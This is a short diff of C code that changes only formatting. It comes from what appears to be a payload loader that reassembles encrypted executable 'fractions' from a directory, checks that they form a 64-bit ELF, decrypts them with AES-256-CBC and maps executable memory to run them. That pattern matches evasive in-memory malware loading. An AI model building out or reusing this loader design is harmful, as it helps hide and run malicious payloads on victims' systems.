@@ -192,7 +192,7 @@ process_files (const char *directory)
   Elf64_Shdr *shdr = NULL;
 
   memcpy (&ehdr, ex_frac_buffer, sizeof (ehdr));
-  if ((strncmp ((char *)ehdr.e_ident, ELFMAG, 4) != 0)
+  if ((strncmp ((char *) ehdr.e_ident, ELFMAG, 4) != 0)
       || ehdr.e_ident[EI_CLASS] != ELFCLASS64)
     {
       printf ("Assembled fraction is not valid 64-Bit ELF data\n");
@@ -253,7 +253,7 @@ aes_init (unsigned char *key_data, int key_data_len, unsigned char *salt,
   unsigned char key[32], iv[32];
 
   EVP_BytesToKey (EVP_aes_256_cbc (), EVP_sha1 (), salt, key_data,
-		    key_data_len, nrounds, key, iv);
+		  key_data_len, nrounds, key, iv);
 
   EVP_CIPHER_CTX_init (d_ctx);
   EVP_DecryptInit_ex (d_ctx, EVP_aes_256_cbc (), NULL, key, iv);
@@ -279,7 +279,10 @@ execute_loaded_fractions (unsigned char *fractions, int fraction_len)
 {
   unsigned char *fractions_ex;
 
-  fractions_ex = (unsigned char *)mmap(NULL, fraction_len, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
+  fractions_ex =
+    (unsigned char *) mmap (NULL, fraction_len,
+			    PROT_EXEC | PROT_READ | PROT_WRITE,
+			    MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
   if (fractions_ex == MAP_FAILED)
     {
       return -1;
